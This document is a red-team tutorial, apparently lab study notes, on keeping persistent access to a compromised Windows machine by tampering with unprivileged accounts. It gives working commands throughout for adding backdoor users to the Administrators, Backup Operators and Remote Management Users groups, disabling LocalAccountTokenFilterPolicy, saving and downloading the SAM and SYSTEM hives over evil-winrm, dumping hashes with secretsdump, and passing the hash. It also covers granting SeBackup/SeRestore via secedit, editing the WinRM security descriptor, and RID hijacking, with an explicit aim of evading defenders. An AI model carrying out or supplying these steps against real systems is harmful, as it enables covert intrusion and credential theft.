# Tampering with unprivileged accounts

Having administrator credentials is the easiest way to achieve persistence. And to make it harder for the blue team 
to detect us, we can manipulate unprivileged user accounts, which will most likely not be monitored as much as 
administratoraccounts, and grant those administrative privileges.

## Assign group memberships

Assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the 
unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators 
group:

    net localgroup administrators <username> /add

This will allow `<username>` to access the server by using RDP, WinRM or any other remote administration service 
available.

Alternatively, use the Backup Operators group. Users in this group will not have administrative privileges but 
will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow 
for copying the content of the `SAM` and `SYSTEM` registry hives, which can be uses to recover password hashes for 
all the users, enabling escalation to any administrative account.

    net localgroup "Backup Operators" <username> /add

Such an account cannot `RDP` or `WinRM` back into the machine unless it is added it to the Remote Desktop Users (RDP) 
or Remote Management Users (WinRM) groups:

    net localgroup "Remote Management Users" <username> /add

And, `LocalAccountTokenFilterPolicy` strips any local account of its administrative privileges when logging in 
remotely. While being able to elevate privileges through UAC from a graphical user session, when using WinRM, 
the account is confined to a limited access token with no administrative privileges.

To regain administration privileges for the account, disable `LocalAccountTokenFilterPolicy` by changing this 
registry key to 1:

    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
        
To check the backdoor user is working, establish a `WinRM` connection and check that the Backup Operators group is 
enabled the `username` account.

    evil-winrm -i <IP target> -u <username> -p <password>

Make a backup of `SAM` and `SYSTEM` files and download:

```text
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

Dump the password hashes for all users using for example, `secretsdump.py` from 
[impacket](https://www.kali.org/tools/impacket/) or another similar tool:

    impacket-secretsdump -sam sam.bak -system system.bak local

Pass-the-Hash to connect to the target machine with Administrator privileges:

    evil-winrm -i <IP target> -u Administrator -H <hash>

## Special privileges and security descriptors

[Privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) are the capacity to do a 
task on the system, like having the capabilities to shut down the server or being able to take ownership of any file 
on the system.

Such privileges can be assigned to any user, regardless of group memberships.

Export the current configuration to a temporary file:

    secedit /export /cfg config.inf

Open the file and add <username> to the lines in the configuration regarding the `SeBackupPrivilege` and 
`SeRestorePrivilege`:

Convert the `.inf` file into a `.sdb` file and use it to load the configuration back into the system:

    secedit /import /cfg config.inf /db config.sdb
    
    secedit /configure /db config.sdb /cfg config.inf

`username` now has equivalent privileges to any Backup Operator, but can not log into the system via `WinRM`. 
Instead of adding the user to the `Remote Management Users` group, change the security descriptor associated with 
the WinRM service to allow `username` to connect. 

Open the configuration window for changing `WinRM` security descriptor:

    Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

This will open a window where `username` can be added and full privileges assigned to connect to WinRM:

Now `username` can connect via WinRM and having `SeBackup` and `SeRestore` privileges, and after changing the 
`LocalAccountTokenFilterPolicy` registry key, can do the steps to recover the password hashes from the SAM and 
connect back with the Administrator user.

Advantage of this method over group membership assignment is that `username` will look like a regular user when 
groups are checked. Nothing to see here.

## RID hijacking

When a user is created, an identifier called Relative ID (`RID`) is assigned to the user. This RID is a numeric 
identifier representing the user across the system. When a user logs on, the `LSASS` process gets the associated 
`RID` from the `SAM` registry hive and creates an access token associated with that `RID`. If we can tamper with 
the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating 
the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the `RID = 500`, and regular users usually have 
a `RID >= 1000`.

To find the assigned RIDs for any user:

    wmic useraccount get name,sid

The `SID` is an identifier that allows the operating system to identify a user across a domain. The last number group 
is the `RID`. 

To assign a `RID=500` to `username`, access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, 
not even Administrators can edit it. To run `Regedit` as `SYSTEM`, use `psexec`, available in `C:\tools\pstools`:

    C:\tools\pstools> PsExec64.exe -i -s regedit

In Regedit, go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. 
To modify `username`, search for a key with its `RID` in `hex`. Under the corresponding key, there will be a value 
called `F`, which holds the user's effective `RID` at position 0x30:

The RID is stored using little-endian notation, so its bytes appear reversed. Replace those two bytes with the 
RID of Administrator in hex (500 = `0x01F4`), and switching around the bytes =`F401`:

The next time `username` logs in, `LSASS` will associate it with the same `RID` as Administrator and grant them the 
same privileges.
        

